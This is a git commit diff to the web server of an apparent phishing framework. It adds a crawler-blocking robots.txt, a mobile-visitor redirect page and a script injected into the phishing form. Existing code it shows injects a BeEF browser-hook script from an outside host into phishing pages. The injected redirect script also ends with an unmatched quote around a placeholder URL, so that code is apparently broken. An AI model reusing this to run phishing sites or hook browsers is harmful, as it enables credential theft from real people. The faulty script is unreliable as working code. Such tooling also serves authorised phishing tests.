f9f544c7d5c6dbabf90beb58ababa733adba610e
Adam Compton <adam.compton@gmail.com>
2018-09-24 12:25:46 -0400

    - added a default robots.txt file - added a default mobile web page that redirects to specified location - added code to index page to send visitor to /mobile if they are using     a mobile device

--- spf/web.py
+++ spf/web.py
@@ -1,5 +1,9 @@
 #!/usr/bin/env python
 
+#from __future__ import absolute_import
+#from __future__ import division
+#from __future__ import print_function
+
 from twisted.internet import reactor, ssl
 from twisted.web.resource import Resource
 from twisted.web.server import Site, NOT_DONE_YET
@@ -13,6 +17,23 @@ import subprocess
 from core.utils import Utils
 from core.display import Display
 from core.mydb import MyDB
+
+
+# define standard static page
+class staticPage(Resource):
+    def __init__(self, text="<html><body></body></html>"):
+        self.text = text
+
+    def render_GET(self, request):
+        return self.text
+
+# define standard mobile page
+class mobilePage(Resource):
+    def __init__(self, url, title="Mobile Device Detected"):
+        self.text=" <html> <br> <br> <br> <head> <meta content='text/html; charset=windows-1252' http-equiv='content-type'> <meta http-equiv='refresh' content='5;URL="+url+"'> <title>"+title+"</title> </head> <body> <center> <br> <br> <br> <br>You are attempting to access this site from a mobile device.  <br> <br>Please try again later from a desktop computer.  </center> </body> </html>"
+
+    def render_GET(self, request):
+        return self.text
 
 # define standard error page
 class errorPage(Resource):
@@ -58,6 +79,9 @@ class phishingForm(Resource):
                html = re.sub("</head>", js + "</head>", html, flags=re.I)
             if (self.config["enable_beef"] == "1"):
                html = re.sub("</head>", "<script src=\"http://" + self.config["beef_ip"] + "/hook.js\" type=\"text/javascript\"></script>" + "</head>", html, flags=re.I)
+            # enable mobile device redirect
+            html = re.sub("</head>", "<script>(function(a,b){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| ||a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(a.substr(0,4)))window.location=b})(navigator.userAgent||navigator.vendor||window.opera,<site_url>/mobile.html');</script>", html, flags=re.I)
+
             self.index = html
 
     def render_GET(self, request):
@@ -102,15 +126,18 @@ class PhishingSite():
         self.resource = Resource()
         self.resource.putChild("index", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
         self.resource.putChild("", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
+        self.resource.putChild("robots.txt", staticPage("User-agent: *\rDisallow: /"))
 
         if (self.config["error_url"]):
             url = self.config["error_url"]
             self.resource.putChild("error", errorRedirectPage(url))
+            self.resource.putChild("mobile", mobilePage(url))
         elif (self.config["error_text"]):
             text = self.config["error_text"]
-            self.resource.putChild("error", errorPage(text))
+            self.resource.putChild("error", staticPage(text))
         else:
-            self.resource.putChild("error", errorPage())
+            self.resource.putChild("error", staticPage("<html><body><center><h1>An error has occured.  Please try again later.</h1></center></body></html>"))
+            self.resource.putChild("mobile", mobilePage(url="/"))
         self.loadChildren()
 
     # load any necessary resource subdirectories: js, css, img, etc...
